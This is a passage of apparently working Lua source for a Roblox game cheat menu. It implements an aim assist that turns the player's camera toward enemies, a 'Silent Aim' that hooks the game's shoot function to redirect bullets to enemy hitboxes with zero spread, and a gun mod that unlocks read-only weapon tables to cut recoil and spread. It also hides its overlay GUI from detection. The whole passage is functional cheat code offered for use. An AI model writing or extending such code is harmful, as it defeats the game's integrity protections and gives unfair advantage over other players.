									local m, h, B = H[2](), GetPlayerList(), H[1].MaxTargets

									for t = 1, #h, 1 do
										local x = h[t]
										t = x.Character
										local h = t and (FindFirstChildOfClass(t, "Humanoid"))
										local R = t and (FindFirstChild(t, "HumanoidRootPart"))
										local O = t and (FindFirstChild(t, "Head"))

										if
											x ~= LocalPlayer
											and t
											and not FindFirstChildOfClass(t, "ForceField")
											and h
											and h.Health > 0
											and R
											and O
											and (IsA(O, "BasePart"))
											and (CheckState(x))
											and (H[3](nil, x))
											and not H[4][7][H[4][6]](x)
										then
											local k, j =
												m and (m.Position - R.Position).Magnitude or 0,
												FindFirstChild(t, "UpperTorso")

											j = if j and not IsA(j, "BasePart") then nil else j
											local m = FindFirstChild(t, "LowerTorso")
											m = if m and not IsA(m, "BasePart") then nil else m
											local i = nil

											if H[1].Count < B then
												H[1].Count = H[1].Count + 1
												i = H[1].Count
											else
												local z, Y = D:Ra(H[5], 1), 1

												for U = 2, B, 1 do
													local B = D:Ra(H[5], U)

													if B > z then
														z, Y = B, U
													end
												end

												i = if k < z then Y else i
											end

											if i then
												D:xa(H[6], i, x)
												D:xa(H[7], i, t)
												D:xa(H[8], i, h)
												D:xa(H[9], i, R)
												D:xa(H[10], i, O)
												D:xa(H[11], i, j)
												D:xa(H[12], i, m)
												D:xa(H[5], i, k)
											end
										end
									end

									return H[1].Count
								end

								local function fn99(arg, arg2, arg3, arg4)
									local v17 = tbl10

									if not v17.LosReady or v17.LosFilter[1] ~= arg4 then
										v17.LosReady = true
										v17.LosFilter[1] = arg4
										v17.LosFilter[2] = FindFirstChild(workspace, "Local")
										v17.LosParams.FilterDescendantsInstances = v17.LosFilter
									end

									local n12 = arg2 - arg
									local magnitude = n12.Magnitude
									if magnitude <= 0.25 then
										return true
									end
									local losParams = v17.LosParams
									local hit = RaycastWorkspace(arg, n12.Unit * Min(magnitude, 1500), losParams)
									return not hit or hit.Instance and IsDescendantOf(hit.Instance, arg3)
								end

								local function fn100(arg, arg2, arg3, arg4, arg5)
									arg2 = arg2 or EmptyVector3
									local n12 = n8 + arg3 / n9 * n10
									return arg + NewVector3(arg2.X * arg4, arg2.Y * arg5, arg2.Z * arg4) * n12 * n11
								end

								local function fn101()
									local animation = tbl9.AimAssist.Animation
									local flag2 = type(animation) == "string" and Enum.EasingStyle[animation]
									if typeof(flag2) == "EnumItem" then
										return flag2
									end
									return Enum.EasingStyle.Linear
								end

								local function fn102(arg, arg2)
									if arg < 0 then
										arg = 0
									elseif arg > 1 then
										arg = 1
									end

									return TweenService:GetValue(arg, arg2, Enum.EasingDirection.InOut)
								end

								local function fn103(arg, arg2, arg3)
									if arg2 == Enum.EasingStyle.Linear then
										return arg
									end
									local num = tonumber(arg3)

									if not num or num <= 0 then
										num = 0.016666666666666666
									end

									return fn102(Clamp(arg * 10 * num, 0, 1), arg2)
								end

								local function step2(arg, arg2)
									arg = arg and arg.tool
									local toolState = arg and arg.toolState
									local flag2 = not toolState

									if not flag2 then
										flag2 = (toolState.ammo or 0) <= 0
									end

									if flag2 then
										return
									end
									local v17 = fn69()
									local v18 = fn71()
									local camera = Camera()
									if not (v17 and v18 and camera) then
										return
									end
									local cFrame = camera.CFrame
									local position = cFrame.Position
									local viewportSize = camera.ViewportSize
									local v19, v20 = fn93(camera)
									local v21 = fn94(camera, tbl9.AimAssist.Fov)
									local huge = Huge
									local useFov = tbl9.AimAssist.UseFov
									local range = tbl9.AimAssist.Range
									local predictionX = tbl9.AimAssist.PredictionX
									local predictionY = tbl9.AimAssist.PredictionY
									local n12 = Max(1, Min(viewportSize.X, viewportSize.Y) * 0.5)
									local n13 = nil
									local n14 = nil

									for i = 1, fn98() do
										local v22 = v13[7][v13[6] + i]
										local primaryPart = fn97(i) or v14[7][v14[6] + i]

										if (not primaryPart or not primaryPart.Parent) and v22 then
											primaryPart = v22.PrimaryPart
										end

										if primaryPart and primaryPart.Parent then
											local position2 = primaryPart.Position
											local v23 = LocalPlayer:DistanceFromCharacter(position2)

											if v23 <= range then
												local v24 = fn100(
													position2,
													primaryPart.AssemblyLinearVelocity
														or primaryPart.Velocity
														or EmptyVector3,
													v23,
													predictionX,
													predictionY
												)

												local vector = PointToObjectSpace(cFrame, v24)
												local magnitude = vector.Magnitude

												if magnitude > 0.35 then
													local n15 = 1 / magnitude
													local n16 = vector.X * n15
													local n17 = vector.Y * n15
													local n18 = -vector.Z * n15

													if n18 > 0.02 then
														local v25, v26, v27, v28 = WorldToViewport(v24)

														if v27 > 0.05 then
															local n19 = v25 - v19
															local n20 = v26 - v20
															local n21 = Sqrt(n19 * n19 + n20 * n20)

															if not useFov or n21 <= v21 then
																if not v28 then
																	n21 += 400
																end

																local n22 = (n21 / n12) ^ 2 * 1.55
																	+ (v23 / Max(1, range)) ^ 2 * 0.35

																if
																	n22 < huge and fn99(position, position2, v22, v17)
																then
																	local toRad = ToRad
																	n13 = Atan2(n16, n18) / toRad
																	local toRad2 = ToRad
																	n14 = Atan2(n17, n18) / toRad2
																	huge = n22
																end
															end
														end
													end
												end
											end
										end
									end

									if not n13 then
										return
									end
									local n15 = 1

									if arg then
										n15 = arg.GetData and arg:GetData()
										n15 = n15 and n15.aimAssistMod or arg.aimAssistMod or 1
									end

									local v22 = fn101()
									local v23 = fn103(tbl9.AimAssist.SpeedX * n15, v22, arg2)
									local v24 = fn103(tbl9.AimAssist.SpeedY * n15, v22, arg2)
									local xAngle = GetAttribute(LocalPlayer, "xAngle") or 0
									local n16 = Clamp((GetAttribute(LocalPlayer, "yAngle") or 0) + n14 * v24, -80, 80)
									SetAttribute(LocalPlayer, "xAngle", (xAngle - n13 * v23) % 360)
									SetAttribute(LocalPlayer, "yAngle", n16)
								end

								tbl9.AimAssist.Module = legit:CreateModule({
									Id = "wanted-aim-assist",
									Name = "AimAssist",
									Default = false,
									Callback = function(arg)
										tbl9.AimAssist.Enabled = arg == true

										if arg then
											AimAssist.Step = step2
											fn96()
										else
											AimAssist.Step = step
											fn95()
										end
									end,
								})

								tbl9.AimAssist.Module:CreateSelector({
									Id = "wanted-aim-assist-part",
									Name = "Part",
									Options = { { Value = "Head" }, { Value = "Body" } },
									Default = tbl9.AimAssist.Part,
									Callback = function(part)
										tbl9.AimAssist.Part = part
									end,
								})

								tbl9.AimAssist.Module:CreateSlider({
									Id = "wanted-aim-assist-x-speed",
									Name = "X Speed",
									Min = 0.1,
									Max = 5,
									Default = tbl9.AimAssist.SpeedX,
									Step = 0.1,
									Callback = function(speedX)
										tbl9.AimAssist.SpeedX = speedX
										fn92(speedX)
									end,
								})

								tbl9.AimAssist.Module:CreateSlider({
									Id = "wanted-aim-assist-y-speed",
									Name = "Y Speed",
									Min = 0.1,
									Max = 5,
									Default = tbl9.AimAssist.SpeedY,
									Step = 0.1,
									Callback = function(speedY)
										tbl9.AimAssist.SpeedY = speedY
									end,
								})

								tbl9.AimAssist.Module:CreateSelector({
									Id = "wanted-aim-assist-animation",
									Name = "Animation",
									Options = {
										{ Value = "Linear" },
										{ Value = "Sine" },
										{ Value = "Quad" },
										{ Value = "Cubic" },
										{ Value = "Quart" },
										{ Value = "Quint" },
										{ Value = "Exponential" },
										{ Value = "Circular" },
										{ Value = "Back" },
										{ Value = "Bounce" },
										{ Value = "Elastic" },
									},
									Default = tbl9.AimAssist.Animation,
									Callback = function(animation)
										tbl9.AimAssist.Animation = animation
									end,
								})

								tbl9.AimAssist.Module:CreateSlider({
									Id = "wanted-aim-assist-prediction-x",
									Name = "Prediction X",
									Min = 0,
									Max = 7,
									Default = tbl9.AimAssist.PredictionX,
									Step = 0.01,
									Callback = function(predictionX)
										tbl9.AimAssist.PredictionX = predictionX
									end,
								})

								tbl9.AimAssist.Module:CreateSlider({
									Id = "wanted-aim-assist-prediction-y",
									Name = "Prediction Y",
									Min = 0,
									Max = 7,
									Default = tbl9.AimAssist.PredictionY,
									Step = 0.01,
									Callback = function(predictionY)
										tbl9.AimAssist.PredictionY = predictionY
									end,
								})

								tbl9.AimAssist.Module:CreateSlider({
									Id = "wanted-aim-assist-range",
									Name = "Range",
									Min = 10,
									Max = 1000,
									Default = tbl9.AimAssist.Range,
									Step = 1,
									Callback = function(range)
										tbl9.AimAssist.Range = range
									end,
								})

								local useFov = tbl9.AimAssist.Module:CreateToggle({
									Id = "wanted-aim-assist-use-fov",
									Name = "Use Fov",
									Default = tbl9.AimAssist.UseFov,
									Callback = function(arg)
										tbl9.AimAssist.UseFov = arg == true
									end,
								})

								tbl9.AimAssist.Module:CreateSlider({
									Id = "wanted-aim-assist-fov",
									Name = "Fov",
									Min = 1,
									Max = 180,
									Default = tbl9.AimAssist.Fov,
									Step = 0.1,
									Nested = true,
									Parent = useFov,
									Callback = function(fov)
										tbl9.AimAssist.Fov = fov
									end,
								})

								tbl9.AimAssist.Module:CreateColorPicker({
									Id = "wanted-aim-assist-fov-color",
									Name = "Color",
									Default = tbl9.AimAssist.FovColor,
									Nested = true,
									Parent = useFov,
									Callback = function(fovColor)
										tbl9.AimAssist.FovColor = fovColor
									end,
								})

								local function fn104()
									local tbl11 = {
										Head = { "Head" },
										Body = { "UpperTorso", "LowerTorso", "Torso", "HumanoidRootPart" },
										Arms = {
											"LeftUpperArm",
											"RightUpperArm",
											"LeftLowerArm",
											"RightLowerArm",
											"Left Arm",
											"Right Arm",
										},
										Legs = {
											"LeftUpperLeg",
											"RightUpperLeg",
											"LeftLowerLeg",
											"RightLowerLeg",
											"Left Leg",
											"Right Leg",
										},
									}

									local tbl12 = { Head = "Head", Body = "UpperTorso" }

									local tbl13 = {
										Head = NewVector3(1, 1, 1),
										Torso = NewVector3(2, 2, 1),
										UpperTorso = NewVector3(2, 2, 1),
										LowerTorso = NewVector3(2, 2, 1),
										HumanoidRootPart = NewVector3(2, 2, 1),
										["Left Arm"] = NewVector3(1, 2, 1),
										["Right Arm"] = NewVector3(1, 2, 1),
										LeftUpperArm = NewVector3(1, 2, 1),
										RightUpperArm = NewVector3(1, 2, 1),
										LeftLowerArm = NewVector3(1, 2, 1),
										RightLowerArm = NewVector3(1, 2, 1),
										["Left Leg"] = NewVector3(1, 2, 1),
										["Right Leg"] = NewVector3(1, 2, 1),
										LeftUpperLeg = NewVector3(1, 2, 1),
										RightUpperLeg = NewVector3(1, 2, 1),
										LeftLowerLeg = NewVector3(1, 2, 1),
										RightLowerLeg = NewVector3(1, 2, 1),
										Head_Hitbox = NewVector3(1, 1, 1),
									}

									local n12 = 0.05
									local n13 = 24
									local v17 = nil

									local tbl14 = {
										CachedPart = nil,
										ScanAccum = 0,
										ScanConn = nil,
										FovConn = nil,
										OldShoot = nil,
										Hooked = false,
										SelCount = 0,
										BestPart = nil,
										BestAngle = 360,
										PriPart = nil,
										PriAngle = 360,
										FovLastShow = false,
										FovLastX = 0,
										FovLastY = 0,
										FovLastDiam = 0,
									}

									local v18 = nil
									local v19 = nil

									pcall(function()
										local hui = typeof(gethui) == "function" and gethui() or CoreGui
										local ScreenGui = NewInstance("ScreenGui")
										ScreenGui.Name = "\0"
										ScreenGui.IgnoreGuiInset = true
										ScreenGui.ResetOnSpawn = false
										ScreenGui.DisplayOrder = 11
										ScreenGui.Parent = hui
										local Frame = NewInstance("Frame")
										Frame.Name = "\0"
										Frame.BackgroundTransparency = 1
										Frame.AnchorPoint = NewVector2(0.5, 0.5)
										Frame.BorderSizePixel = 0
										Frame.Visible = false
										Frame.Parent = ScreenGui
										local UICorner = NewInstance("UICorner")
										UICorner.CornerRadius = NewUDim(1, 0)
										UICorner.Parent = Frame
										local UIStroke = NewInstance("UIStroke")
										UIStroke.Thickness = thickness
										UIStroke.Transparency = transparency
										UIStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
										UIStroke.Color = NewColor3(1, 1, 1)
										UIStroke.Parent = Frame
										v18 = Frame
										v19 = UIStroke
									end)

									local function fn105()
										local hitboxes = tbl9.SilentAim.Hitboxes
										local selCount = 0

										if hitboxes.Head then
											v17[7][v17[6] + 1] = "Head"
											selCount = 1
										end

										if hitboxes.Body then
											selCount += 1
											v17[7][v17[6] + selCount] = "Body"
										end

										if hitboxes.Arms then
											selCount += 1
											v17[7][v17[6] + selCount] = "Arms"
										end

										if hitboxes.Legs then
											selCount += 1
											v17[7][v17[6] + selCount] = "Legs"
										end

										tbl14.SelCount = selCount
										return selCount
									end

									local v20

									local function fn106(arg)
										local n14 = 0
										local selCount = tbl14.SelCount
										if not arg or selCount < 1 then
											return 0
										end

										local function fn107(arg2)
											if arg2 and IsA(arg2, "BasePart") then
												n14 += 1
												v20[7][v20[6] + n14] = arg2
												return n14 >= n13
											end

											return false
										end

										for i = 1, selCount do
											local v21 = tbl11[v17[7][v17[6] + i]]

											if v21 then
												for i2 = 1, #v21 do
													if fn107(FindFirstChild(arg, v21[i2])) then
														return n14
													end
												end
											end
										end

										local hitbox = FindFirstChild(arg, "Hitbox")

										if hitbox then
											if tbl9.SilentAim.Hitboxes.Head then
												if fn107(FindFirstChild(hitbox, "Head_Hitbox")) then
													return n14
												end
											end

											if tbl9.SilentAim.Hitboxes.Body then
												local children = GetChildren(hitbox)

												for i = 1, #children do
													local v21 = children[i]
													if v21.Name ~= "Head_Hitbox" and fn107(v21) then
														return n14
													end
												end
											end
										end

										return n14
									end

									local function fn107(arg, arg2)
										if not arg then
											return EmptyVector3
										end

										if not arg2 or arg2 <= 0 then
											return arg.Position
										end
										local n14 = arg2 / 200
										local vector = tbl13[arg.Name] or NewVector3(1, 2, 1)
										local position = arg.Position
										local newVector3 = NewVector3
										local x = vector.X
										local n15 = (Random() * 2 - 1) * x * n14
										local y = vector.Y
										local z = vector.Z

										return position
											+ newVector3(
												n15,
												(Random() * 2 - 1) * y * n14,
												(Random() * 2 - 1) * z * n14
											)
									end

									local function fn108(arg, arg2)
										local silentAim = tbl9.SilentAim
										local v21 = fn107(arg, silentAim.PointScale)
										local magnitude = LocalPlayer:DistanceFromCharacter(v21)

										if not magnitude or magnitude <= 0 then
											magnitude = (v21 - arg2).Magnitude
										end

										return fn100(
											v21,
											arg.AssemblyLinearVelocity or arg.Velocity or EmptyVector3,
											magnitude,
											silentAim.PredictionX,
											silentAim.PredictionY
										)
									end

									local function fn109(arg, arg2, arg3)
										if arg == LocalPlayer or not arg2 or not arg3 or arg3.Health <= 0 then
											return false
										end

										if FindFirstChildOfClass(arg2, "ForceField") or not CheckState(arg) then
											return false
										end

										if not fn72(nil, arg) then
											return false
										end

										if tbl9.SilentAim.IgnoreDowned and fn91(arg) then
											return false
										end
										return true
									end

									local function fn110(arg, arg2, arg3)
										if not arg then
											return false
										end

										if arg3 then
											arg3 = arg.Name == arg3 or arg.Name == arg3 .. "_Hitbox"
										end

										if arg3 then
											return true
										end

										return arg2 == "Body"
											and (
												arg.Name == "Torso"
												or arg.Name == "HumanoidRootPart"
												or arg.Name == "LowerTorso"
												or arg.Name == "UpperTorso"
											)
									end

									local function fn111(arg, arg2, arg3, arg4, arg5)
										local character = arg.Character

										if
											not fn109(
												arg,
												character,
												character and FindFirstChildOfClass(character, "Humanoid")
											)
										then
											return
										end

										local humanoidRootPart = FindFirstChild(character, "HumanoidRootPart")

										if humanoidRootPart then
											local n14 = humanoidRootPart.Position - arg2

											if n14.Magnitude > 0.001 then
												if arg4 < Acos(Clamp(Dot(arg3, n14.Unit), -1, 1)) * 2 then
													return
												end
											end
										end

										local v21 = tbl14
										local priority = tbl9.SilentAim.Priority
										local v22 = tbl12[priority]

										for i = 1, fn106(character) do
											local v23 = v20[7][v20[6] + i]
											local n14 = v23.Position - arg2

											if n14.Magnitude >= 0.001 then
												local bestAngle = Acos(Clamp(Dot(arg3, n14.Unit), -1, 1)) * 2

												if bestAngle <= arg4 then
													local v24 = v22 and fn110(v23, priority, v22)

													if
														(bestAngle < v21.BestAngle or v24 and bestAngle < v21.PriAngle)
														and fn99(arg2, v23.Position, character, arg5)
													then
														if bestAngle < v21.BestAngle then
															v21.BestAngle = bestAngle
															v21.BestPart = v23
														end

														if v24 and bestAngle < v21.PriAngle then
															v21.PriAngle = bestAngle
															v21.PriPart = v23
														end
													end
												end
											end
										end
									end

									local function fn112()
										local camera = Camera()
										if not camera then
											return nil
										end

										if fn105() < 1 then
											return nil
										end
										local v21 = tbl14
										v21.BestPart = nil
										v21.BestAngle = 360
										v21.PriPart = nil
										v21.PriAngle = 360
										local position = camera.CFrame.Position
										local lookVector = camera.CFrame.LookVector
										local n14 = Rad(tbl9.SilentAim.Fov)
										local v22 = fn69()
										local players = GetPlayerList()

										for i = 1, #players do
											fn111(players[i], position, lookVector, n14, v22)
										end

										local silentAim = tbl9.SilentAim

										if
											tbl12[silentAim.Priority]
											and silentAim.Accuracy >= Random(1, 100)
											and v21.PriPart
										then
											return v21.PriPart
										end

										return v21.BestPart
									end

									local function fn113()
										local cachedPart = tbl14.CachedPart

										if not cachedPart or not cachedPart.Parent then
											cachedPart = fn112()
											tbl14.CachedPart = cachedPart
										end

										if not cachedPart then
											return nil
										end
										local camera = Camera()

										return fn108(
											cachedPart,
											camera and camera.CFrame.Position or cachedPart.Position
										)
									end

									local function shoot(arg, ...)
										local silentAim = tbl9.SilentAim
										local flag2 = not silentAim.Enabled

										if not flag2 then
											local hitChance = silentAim.HitChance
											flag2 = Random(1, 100) > hitChance
										end

										if flag2 then
											return tbl14.OldShoot(arg, ...)
										end
										local v21 = fn113()
										if typeof(v21) ~= "Vector3" then
											return tbl14.OldShoot(arg, ...)
										end
										arg.aimpoint = v21
										arg.aimpoint2 = v21
										local spread = arg.spread
										arg.spread = 0
										local v22 = pcall
										local oldShoot = tbl14.OldShoot
										local v23 = table.pack(...)
										v23.n = 3 + v23.n - 1
										table.move(v23, 1, v23.n, 3, v23)
										v23[1] = oldShoot
										v23[2] = arg
										local v24, v25 = v22(table.unpack(v23, 1, v23.n))
										arg.spread = spread

										if not v24 then
											error(v25)
										end
									end

									local function fn114()
										if tbl14.FovConn then
											Disconnect(tbl14.FovConn)
											tbl14.FovConn = nil
										end

										if v18 and v18.Visible then
											v18.Visible = false
										end

										tbl14.FovLastShow = false
									end

									local function fn115()
										fn114()
										if not v18 or not v19 then
											return
										end

										local function fn116()
											local v21 = tbl14
											local silentAim = tbl9.SilentAim
											local camera = Camera()

											local fovLastShow = (
												silentAim.Module == nil or silentAim.Module:Get() == true
											)
												and silentAim.VisualizeFov == true
												and camera ~= nil

											if v21.FovLastShow ~= fovLastShow then
												v21.FovLastShow = fovLastShow
												v18.Visible = fovLastShow
											end

											if not fovLastShow then
												return
											end
											local v22, v23 = fn93(camera)
											local fovLastDiam = Max(2, Floor(fn94(camera, silentAim.Fov) * 2 + 0.5))

											if v21.FovLastX ~= v22 or v21.FovLastY ~= v23 then
												v21.FovLastX = v22
												v21.FovLastY = v23
												v18.Position = NewUDim2(0, v22, 0, v23)
											end

											if v21.FovLastDiam ~= fovLastDiam then
												v21.FovLastDiam = fovLastDiam
												v18.Size = NewUDim2(0, fovLastDiam, 0, fovLastDiam)
											end
										end

										fn116()
										tbl14.FovConn = Connect(RunService.RenderStepped, fn116)
									end

									local function fn116()
										tbl9.SilentAim.Enabled = false

										if tbl14.ScanConn then
											Disconnect(tbl14.ScanConn)
											tbl14.ScanConn = nil
										end

										fn114()

										if tbl14.Hooked and tbl14.OldShoot then
											if
												type(restorefunction) == "function"
												and isfunctionhooked
												and isfunctionhooked(Shooter._shoot)
											then
												restorefunction(Shooter._shoot)
											else
												Shooter._shoot = tbl14.OldShoot
											end

											tbl14.Hooked = false
										end

										tbl14.CachedPart = nil
									end

									local function fn117()
										fn116()
										tbl9.SilentAim.Enabled = true

										if type(hookfunction) == "function" then
											tbl14.OldShoot = hookfunction(Shooter._shoot, shoot)
										else
											tbl14.OldShoot = Shooter._shoot
											Shooter._shoot = shoot
										end

										tbl14.Hooked = true

										tbl14.ScanConn = Connect(RunService.Heartbeat, function(arg)
											if not tbl9.SilentAim.Enabled then
												fn116()
												return
											end
											tbl14.ScanAccum = tbl14.ScanAccum + arg
											if tbl14.ScanAccum < n12 then
												return
											end
											tbl14.ScanAccum = 0
											tbl14.CachedPart = fn112()
										end)

										if tbl9.SilentAim.VisualizeFov then
											fn115()
										end
									end

									tbl9.SilentAim.Module = legit:CreateModule({
										Id = "wanted-silent-aim",
										Name = "Silent Aim",
										Default = false,
										Callback = function(arg)
											if arg then
												fn117()
											else
												fn116()
											end
										end,
									})

									tbl9.SilentAim.Module:CreateSlider({
										Id = "wanted-silent-aim-fov",
										Name = "Maximum FOV",
										Min = 0,
										Max = 90,
										Default = tbl9.SilentAim.Fov,
										Step = 0.1,
										Callback = function(fov)
											tbl9.SilentAim.Fov = fov
										end,
									})

									tbl9.SilentAim.Module:CreateSlider({
										Id = "wanted-silent-aim-hit-chance",
										Name = "Hit Chance",
										Min = 0,
										Max = 100,
										Default = tbl9.SilentAim.HitChance,
										Step = 1,
										Callback = function(hitChance)
											tbl9.SilentAim.HitChance = hitChance
										end,
									})

									tbl9.SilentAim.Module:CreateSlider({
										Id = "wanted-silent-aim-accuracy",
										Name = "Accuracy",
										Min = 0,
										Max = 100,
										Default = tbl9.SilentAim.Accuracy,
										Step = 1,
										Callback = function(accuracy)
											tbl9.SilentAim.Accuracy = accuracy
										end,
									})

									tbl9.SilentAim.Module:CreateSlider({
										Id = "wanted-silent-aim-point-scale",
										Name = "Point Scale",
										Min = 0,
										Max = 100,
										Default = tbl9.SilentAim.PointScale,
										Step = 1,
										Callback = function(pointScale)
											tbl9.SilentAim.PointScale = pointScale
										end,
									})

									tbl9.SilentAim.Module:CreateSelector({
										Id = "wanted-silent-aim-priority",
										Name = "Hitscan Priority",
										Options = { { Value = "Closest" }, { Value = "Head" }, { Value = "Body" } },
										Default = tbl9.SilentAim.Priority,
										Callback = function(priority)
											tbl9.SilentAim.Priority = priority
										end,
									})

									tbl9.SilentAim.Module:CreateToggle({
										Id = "wanted-silent-aim-hitbox-head",
										Name = "Head",
										Default = tbl9.SilentAim.Hitboxes.Head,
										Callback = function(arg)
											tbl9.SilentAim.Hitboxes.Head = arg == true
										end,
									})

									tbl9.SilentAim.Module:CreateToggle({
										Id = "wanted-silent-aim-hitbox-body",
										Name = "Body",
										Default = tbl9.SilentAim.Hitboxes.Body,
										Callback = function(arg)
											tbl9.SilentAim.Hitboxes.Body = arg == true
										end,
									})

									tbl9.SilentAim.Module:CreateToggle({
										Id = "wanted-silent-aim-hitbox-arms",
										Name = "Arms",
										Default = tbl9.SilentAim.Hitboxes.Arms,
										Callback = function(arg)
											tbl9.SilentAim.Hitboxes.Arms = arg == true
										end,
									})

									tbl9.SilentAim.Module:CreateToggle({
										Id = "wanted-silent-aim-hitbox-legs",
										Name = "Legs",
										Default = tbl9.SilentAim.Hitboxes.Legs,
										Callback = function(arg)
											tbl9.SilentAim.Hitboxes.Legs = arg == true
										end,
									})

									tbl9.SilentAim.Module:CreateSlider({
										Id = "wanted-silent-aim-prediction-x",
										Name = "Prediction X",
										Min = 0,
										Max = 7,
										Default = tbl9.SilentAim.PredictionX,
										Step = 0.01,
										Callback = function(predictionX)
											tbl9.SilentAim.PredictionX = predictionX
										end,
									})

									tbl9.SilentAim.Module:CreateSlider({
										Id = "wanted-silent-aim-prediction-y",
										Name = "Prediction Y",
										Min = 0,
										Max = 7,
										Default = tbl9.SilentAim.PredictionY,
										Step = 0.01,
										Callback = function(predictionY)
											tbl9.SilentAim.PredictionY = predictionY
										end,
									})

									tbl9.SilentAim.Module:CreateToggle({
										Id = "wanted-silent-aim-visualize-fov",
										Name = "Visualize FOV",
										Default = tbl9.SilentAim.VisualizeFov,
										Callback = function(arg)
											tbl9.SilentAim.VisualizeFov = arg == true

											if tbl9.SilentAim.Enabled and arg then
												fn115()
											else
												fn114()
											end
										end,
									})

									tbl9.SilentAim.Module:CreateToggle({
										Id = "wanted-silent-aim-ignore-downed",
										Name = "Ignore Downed",
										Default = tbl9.SilentAim.IgnoreDowned,
										Callback = function(arg)
											tbl9.SilentAim.IgnoreDowned = arg == true
										end,
									})
								end

								fn104()

								local tbl11 = {
									"climb",
									"climbMax",
									"kickBack",
									"kickBackMax",
									"kickHoriz",
									"kickHorizMax",
									"angle",
									"angleMax",
									"sway",
									"swayMax",
									"firstShotKick",
								}

								local tbl12 = { "spread", "spreadMin", "spreadMax" }
								local tbl13 = {}
								local flag2 = false
								local tbl14 = {}
								local flag3 = false
								local getData = nil
								local fn105 = nil

								fn105 = function(arg)
									if not arg then
										return
									end
									local children = GetChildren(arg)

									for i = 1, #children do
										local v17 = children[i]

										if IsA(v17, "ModuleScript") then
											Insert(tbl14, v17)
										elseif IsA(v17, "Folder") then
											fn105(v17)
										end
									end
								end

								local function fn106(arg)
									if type(arg) ~= "table" or type(setreadonly) ~= "function" then
										return
									end
									pcall(setreadonly, arg, false)

									if type(arg.recoil) == "table" then
										pcall(setreadonly, arg.recoil, false)
									end

									if type(arg.aim) == "table" then
										pcall(setreadonly, arg.aim, false)
									end

									if type(arg.projectile) == "table" then
										pcall(setreadonly, arg.projectile, false)
									end

									if type(arg.cameraShake) == "table" then
										pcall(setreadonly, arg.cameraShake, false)
									end
								end

								local function fn107(arg)
									return type(arg) == "table"
										and type(arg.name) == "string"
										and type(arg.recoil) == "table"
										and (arg.itemType == "Gun" or type(arg.projectile) == "table")
								end

								local function fn108(arg)
									if not fn107(arg) then
										return nil
									end
									local name2 = arg.name
									local v17 = tbl13[name2]
									if v17 then
										return v17
									end

									local tbl15 = {
										recoil = {},
										aimSpreadAngle = nil,
										muzzleVelocity = nil,
										dragCoefficient = nil,
									}

									local recoil = arg.recoil

									for i = 1, #tbl11 do
										local v18 = tbl11[i]

										if type(recoil[v18]) == "number" then
											tbl15.recoil[v18] = recoil[v18]
										end
									end

									for i = 1, #tbl12 do
										local v18 = tbl12[i]

										if type(recoil[v18]) == "number" then
											tbl15.recoil[v18] = recoil[v18]
										end
									end

									if type(arg.aim) == "table" and type(arg.aim.spreadAngle) == "number" then
										tbl15.aimSpreadAngle = arg.aim.spreadAngle
									end

									if type(arg.projectile) == "table" then
										if type(arg.projectile.muzzleVelocity) == "number" then
											tbl15.muzzleVelocity = arg.projectile.muzzleVelocity
										end

										if type(arg.projectile.dragCoefficient) == "number" then
											tbl15.dragCoefficient = arg.projectile.dragCoefficient
										end
									end

									tbl13[name2] = tbl15
									return tbl15
								end

								local function fn109()
									if flag2 then
										return
									end

									if #tbl14 == 0 then
										local shared = FindFirstChild(ReplicatedStorage, "Shared")
										local wanted = shared and FindFirstChild(shared, "Wanted")
										local indicies = wanted and FindFirstChild(wanted, "Indicies")
										local objects = indicies and FindFirstChild(indicies, "Objects")
										fn105(objects and FindFirstChild(objects, "Guns"))
									end

									for i = 1, #tbl14 do
										local ok5, result5 = pcall(require, tbl14[i])

										if ok5 and fn107(result5) then
											fn108(result5)
										end
									end

									flag2 = true
								end

								local function fn110(arg, arg2, arg3, arg4, arg5)
									local v17 = fn108(arg)
									if not v17 then
										return
									end
									fn106(arg)
									local recoil = arg.recoil
									if type(recoil) ~= "table" then
										return
									end

									for i = 1, #tbl11 do
										local v18 = tbl11[i]

										if v17.recoil[v18] ~= nil then
											recoil[v18] = v17.recoil[v18] * arg2
										end
									end

									for i = 1, #tbl12 do
										local v18 = tbl12[i]

										if v17.recoil[v18] ~= nil then
											recoil[v18] = v17.recoil[v18] * arg3
										end
									end

									if v17.aimSpreadAngle ~= nil and type(arg.aim) == "table" then
										arg.aim.spreadAngle = v17.aimSpreadAngle * arg3
									end

									if type(arg.projectile) == "table" then
										if v17.muzzleVelocity ~= nil then
											arg.projectile.muzzleVelocity = v17.muzzleVelocity * arg4
										end

										if v17.dragCoefficient ~= nil then
											if not arg5 or arg5 <= 0 then
												arg5 = 1
											end

											arg.projectile.dragCoefficient = v17.dragCoefficient / arg5
										end
									end
								end

								local function fn111(arg)
									local v17 = tbl13[arg and arg.name]
									if not v17 or type(arg.recoil) ~= "table" then
										return
									end
									fn106(arg)

									for i = 1, #tbl11 do
										local v18 = tbl11[i]

										if v17.recoil[v18] ~= nil then
											arg.recoil[v18] = v17.recoil[v18]
										end
									end

									for i = 1, #tbl12 do
										local v18 = tbl12[i]

										if v17.recoil[v18] ~= nil then
											arg.recoil[v18] = v17.recoil[v18]
										end
									end

									if v17.aimSpreadAngle ~= nil and type(arg.aim) == "table" then
										arg.aim.spreadAngle = v17.aimSpreadAngle
									end

									if type(arg.projectile) == "table" then
										if v17.muzzleVelocity ~= nil then
											arg.projectile.muzzleVelocity = v17.muzzleVelocity
										end

										if v17.dragCoefficient ~= nil then
											arg.projectile.dragCoefficient = v17.dragCoefficient
										end
									end
								end

								local function fn112(arg)
									fn109()

									for i = 1, #tbl14 do
										local ok5, result5 = pcall(require, tbl14[i])

										if ok5 and fn107(result5) then
											arg(result5)
										end
									end

									local v17 = ClientTools.GetLocalEquippedTool()

									if fn107(v17) then
										arg(v17)
									end
								end

								local function fn113()
									fn109()
									if not tbl9.GunMod.Enabled then
										fn112(fn111)
										return
									end
									local n12 = tbl9.GunMod.Recoil / 100
									local n13 = tbl9.GunMod.Spread / 100
									local bulletSpeed = tbl9.GunMod.BulletSpeed
									local bulletLifetime = tbl9.GunMod.BulletLifetime

									fn112(function(arg)
										fn110(arg, n12, n13, bulletSpeed, bulletLifetime)
									end)
								end

								local function fn114()
									if flag3 or type(Objects.GetData) ~= "function" then
										return
									end
									flag3 = true
									getData = Objects.GetData

									Objects.GetData = function(arg, arg2)
										local v17 = getData(arg, arg2)

										if tbl9.GunMod.Enabled and fn107(v17) then
											fn110(
												v17,
												tbl9.GunMod.Recoil / 100,
												tbl9.GunMod.Spread / 100,
												tbl9.GunMod.BulletSpeed,
												tbl9.GunMod.BulletLifetime
											)
										end

										return v17
